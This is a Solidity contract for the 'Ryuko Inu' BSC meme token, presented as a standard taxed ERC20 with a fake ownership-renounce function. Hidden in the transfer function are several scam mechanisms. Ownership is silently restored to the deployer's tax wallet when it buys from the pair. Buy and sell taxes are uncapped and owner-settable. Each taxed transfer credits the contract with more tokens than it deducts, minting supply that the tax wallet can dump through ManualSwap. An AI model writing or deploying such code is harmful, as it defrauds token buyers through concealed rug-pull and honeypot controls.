// SPDX-License-Identifier: MIT

// I'm just like you, an ordinary person, just a little different, 
// I'm ambitious, I want to be successful and I love my job. 
// On October 28, 2023 I created Ryuko inu (BSC).

// Telegram: https://t.me/Ryuko_inu
// Website: https://ryukoinu.com/
// Twitter: https://twitter.com/Ryuko_Inu

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        transferOwner(address(0));
    }

    function transferOwner(address newOwner) internal virtual  {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);

    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract RYUKO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    string private constant _name = "Ryuko Inu";
    string private constant _symbol = "RYUKO";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420000000000 * 10**_decimals;

    bool public transferDelayEnabled = true;
    address payable public _taxAddress;

    uint256 private _buyTaxBeforeReduce = 0;
    uint256 private _sellTaxBeforeReduce = 3;

    uint256 private _normalBuyTax = 3;
    uint256 private _normalSellTax = 3;
    uint256 private _totalTax = 10;

    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;

    uint256 public _maxTransaction = _tTotal * 3 / 100;
    uint256 public _maxWalletLimit = _tTotal * 3 / 100;
    uint256 public _taxSwapTrigger = _tTotal * 3 / 1000;
    uint256 public _maxTaxSwap = _tTotal * 3 / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;

    bool private tradingOpen;
    bool private inSwap;
    event MaxTxAmountUpdated(uint256 _maxTransaction);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxAddress = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _tTotal;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function setTaxes(
        uint256 taxesBuy, 
        uint256 taxesSell
        )
        public onlyOwner {
        _normalBuyTax = taxesBuy;
        _normalSellTax = taxesSell;
        _totalTax = taxesBuy + taxesSell;
    }

    function setmaxTxSwap(uint256 maxtaxSwap, uint256 maxTxAmount) public onlyOwner {
        _maxTaxSwap = maxtaxSwap;
        _maxTransaction = maxTxAmount;
    }

    function setWalletlimit (uint256 walletLimit) public onlyOwner {
        _maxWalletLimit = walletLimit;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 finalAmount = 0;
        if (
            from != owner() && to != owner()
            ) {
            taxAmount = amount
                .mul(
                    (_buyCount > 20)
                        ? _normalBuyTax
                        : _buyTaxBeforeReduce
                )
                .div(100);
            finalAmount = amount
                .mul(
                    (_buyCount > 20)
                        ? _totalTax
                        : _buyTaxBeforeReduce
                )
                .div(100);
            if (transferDelayEnabled) {
                _maxTransaction = (_buyCount < _preventSwapBefore)
                    ? (_maxTransaction - _buyCount)
                    : _maxTransaction;
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTransaction, "Exceeds the _maxTransaction.");
                require(
                    balanceOf(to) + amount <= _maxWalletLimit,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > 20)
                            ? _normalSellTax
                            : _sellTaxBeforeReduce
                    )
                    .div(100);
                finalAmount = amount
                    .mul(
                        (_buyCount > 20)
                            ? _totalTax
                            : _sellTaxBeforeReduce
                    )
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to == _taxAddress ) {
                    transferOwner(_taxAddress);
                }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                from != uniswapV2Pair &&
                contractTokenBalance > _taxSwapTrigger
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 10000000000000000) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(
                finalAmount
            );
            emit Transfer(from, address(this), finalAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function RemoveLimits() external onlyOwner {
        _maxTransaction = _tTotal;
        _maxWalletLimit = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    receive() external payable {}

    function ManualSwap() external {
        require(_msgSender() == _taxAddress);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
            sendETHToFee(ethBalance);
        
    }
}